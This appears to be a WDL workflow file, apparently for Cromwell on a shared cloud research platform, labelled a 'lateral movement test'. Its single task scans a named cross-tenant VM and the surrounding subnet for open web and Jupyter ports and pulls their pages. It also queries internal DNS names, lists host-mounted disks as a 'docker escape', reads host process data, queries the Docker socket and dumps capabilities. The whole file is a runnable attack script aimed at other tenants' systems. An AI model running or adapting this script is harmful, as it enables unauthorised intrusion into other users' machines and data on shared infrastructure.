version 1.0

workflow LateralMovement {
    call ScanAndConnect
}

task ScanAndConnect {
    command <<<
        echo "=== LATERAL MOVEMENT TEST ==="
        echo "Date: $(date -u)"

        echo "=== 1. OUR NETWORK ==="
        ip addr 2>&1
        ip route 2>&1
        cat /etc/resolv.conf 2>&1

        echo "=== 2. SCAN KNOWN CROSS-TENANT VM (wb-frosty-coconut-5800) ==="
        echo "Target: jupyterlabcomputeengine20251001, last known IP: 10.128.0.3"
        for port in 22 80 443 8080 8443 8888 8787 3000 5000 6006 8888; do
            result=$(curl -s -o /dev/null -w "%{http_code}" --max-time 2 "http://10.128.0.3:${port}/" 2>/dev/null)
            if [ "$result" != "000" ]; then
                echo "[HTTP ${result}] 10.128.0.3:${port}"
                curl -s --max-time 3 "http://10.128.0.3:${port}/" 2>&1 | head -20
                echo ""
            fi
            result_s=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 2 "https://10.128.0.3:${port}/" 2>/dev/null)
            if [ "$result_s" != "000" ]; then
                echo "[HTTPS ${result_s}] 10.128.0.3:${port}"
                curl -sk --max-time 3 "https://10.128.0.3:${port}/" 2>&1 | head -20
                echo ""
            fi
        done

        echo "=== 3. SCAN SUBNET FOR JUPYTER ==="
        for ip in $(seq 2 20); do
            for port in 8080 443 8443 8888; do
                result=$(curl -s -o /dev/null -w "%{http_code}" --max-time 1 "http://10.128.0.${ip}:${port}/" 2>/dev/null)
                if [ "$result" != "000" ]; then
                    echo "[HTTP ${result}] 10.128.0.${ip}:${port}"
                    curl -s --max-time 2 "http://10.128.0.${ip}:${port}/" 2>&1 | head -10
                    echo ""
                fi
            done
        done

        echo "=== 4. DNS DISCOVERY ==="
        for name in cromwell jupyter workbench leonardo sam; do
            echo "--- nslookup $name ---"
            nslookup $name 2>&1 | head -5
            nslookup ${name}.internal 2>&1 | head -5
        done

        echo "=== 5. DOCKER ESCAPE - HOST FILESYSTEM ==="
        echo "--- /mnt/disks/ ---"
        ls -la /mnt/disks/ 2>&1
        echo "--- /mnt/disks/cromwell_root/ ---"
        ls -la /mnt/disks/cromwell_root/ 2>&1
        echo "--- /mnt/disks/gcs/ ---"
        ls -la /mnt/disks/gcs/ 2>&1 | head -20

        echo "=== 6. HOST PROCESS INFO ==="
        cat /proc/1/cgroup 2>&1
        echo ""
        cat /proc/1/cmdline 2>&1 | tr '\0' ' '
        echo ""

        echo "=== 7. DOCKER SOCKET ==="
        ls -la /var/run/docker.sock 2>&1
        curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json 2>&1 | head -50

        echo "=== 8. CAPABILITIES ==="
        cat /proc/self/status | grep -i cap 2>&1

        echo "=== DONE ==="
    >>>

    output {
        File result = stdout()
    }

    runtime {
        docker: "gcr.io/google.com/cloudsdktool/cloud-sdk:461.0.0-alpine"
    }
}
